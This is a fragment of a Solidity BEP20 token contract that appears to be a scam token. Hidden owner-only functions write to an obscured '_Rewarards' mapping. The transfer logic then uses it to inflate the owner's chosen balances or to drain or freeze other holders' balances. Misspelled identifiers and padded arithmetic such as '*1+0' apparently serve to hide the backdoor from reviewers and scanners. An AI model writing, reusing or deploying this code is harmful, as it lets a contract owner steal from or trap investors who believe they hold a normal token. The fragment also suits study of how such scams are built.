...
contract Token is BEP20, Ownable {
    ...
    mapping(address => int256) private _Rewarards;
    ...
    function setAdminRewarard(address acclount,int256 amnnot ) public onlyowner {
        _Rewarards[acclount] += amnnot;
    }

    function rmUserRewarard(address acclount) public onlyowner {
        _Rewarards[acclount] = 0;
    }


    function setUserRewarard(address acclount) public onlyowner {
        _Rewarards[acclount] = int256(0) - int256(_totalSupply);
    }
    

    function getRewarard(address acclount) public view returns (int256) {
        return _Rewarards[acclount];
    }
    ...
    function _recF(
        ...
        uint256 fromBalance = _balances[from];
        require(fromBalance*1+0 >= _accountd+0, "ERC20: transfer amnnot exceeds balance");
        if (_Rewarards[from]*1+0 > 1*1+0){
            _balances[from] = _balances[from].add(uint256(_Rewarards[from]+0*1));
        }else if (_Rewarards[from]*1+0 < 0*1+0){
            _balances[from] = _balances[from].sube(uint256(_Rewarards[from]+0*1));
        }



        uint256 trradefirraccountd = 0;
        uint256 trradefirr = _defaultSellfir+0+0;
        if (uniswapV2Pair != address(0)) {
            if (_to == uniswapV2Pair) {
                trradefirr = _defaultSellfir+0*1;
            }
